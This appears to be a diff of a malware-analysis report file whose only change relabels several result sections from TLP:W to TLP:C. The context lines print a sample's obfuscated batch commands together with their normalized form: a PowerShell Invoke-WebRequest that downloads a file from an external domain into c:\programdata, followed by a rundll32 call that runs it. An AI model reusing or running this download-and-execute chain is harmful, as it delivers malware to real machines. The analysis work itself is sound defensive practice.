@@ -7,7 +7,7 @@
         "auto_collapse": false,
         "body": "[{\"Command [trun.]\": \"%rfptoz%%iwqnoh%%kmbflw%%gkboij%%jsmwxd%%jseful%%dpgaru%%gkboij%%hcbszt%%hcbszt% %knfogq%%tnkoyi%%hm\", \"Normalized [trun.]\": \"powershell invoke-webrequest -uri https://ramdungexpedition.com/image/017.gif -outfile c:\\\\programdat\"}, {\"Command [trun.]\": \"%jsmwxd%%mhilqc%%tnkoyi%%xoygqw%%hcbszt%%hcbszt%32 %ptjeix%:\\\\%rfptoz%%jsmwxd%%iwqnoh%%ujkpla%%jsmwxd\", \"Normalized\": \"rundll32 c:\\\\programdata\\\\PNwK.jpg init\"}, {\"Command\": \"%gkboij%%yrukzs%%knfogq%%vxojht%\", \"Normalized\": \"exit\"}]",
         "body_format": "TABLE",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": {
           "attack_ids": [],
@@ -25,7 +25,7 @@
         "auto_collapse": false,
         "body": "[{\"Count\": 85, \"Command [trun.]\": \"%rfptoz%%iwqnoh%%kmbflw%%gkboij%%jsmwxd%%jseful%%dpgaru%%gkboij%%hcbszt%%hcbszt% %knfogq%%tnkoyi%%hm\", \"Normalized [trun.]\": \"powershell invoke-webrequest -uri https://ramdungexpedition.com/image/017.gif -outfile c:\\\\programdat\"}, {\"Count\": 26, \"Command [trun.]\": \"%jsmwxd%%mhilqc%%tnkoyi%%xoygqw%%hcbszt%%hcbszt%32 %ptjeix%:\\\\%rfptoz%%jsmwxd%%iwqnoh%%ujkpla%%jsmwxd\", \"Normalized\": \"rundll32 c:\\\\programdata\\\\PNwK.jpg init\"}]",
         "body_format": "TABLE",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": {
           "attack_ids": [],
@@ -43,7 +43,7 @@
         "auto_collapse": false,
         "body": "[{\"URL\": \"https://ramdungexpedition.com/image/017.gif\", \"Destination\": \"c:\\\\programdata\\\\PNwK.jpg\", \"Command [trun.]\": \"powershell.exe  invoke-webrequest -uri https://ramdungexpedition.com/image/017.gif -outfile c:\\\\progr\"}]",
         "body_format": "TABLE",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": null,
         "tags": {
@@ -62,7 +62,7 @@
         "auto_collapse": false,
         "body": "[[\"TABLE\", [{\"Command\": \"rundll32 c:\\\\programdata\\\\PNwK.jpg init\"}]], [\"TEXT\", \"c:\\\\programdata\\\\PNwK.jpg was downloaded from https://ramdungexpedition.com/image/017.gif\"]]",
         "body_format": "MULTI",
-        "classification": "TLP:W",
+        "classification": "TLP:C",
         "depth": 0,
         "heuristic": {
           "attack_ids": [],
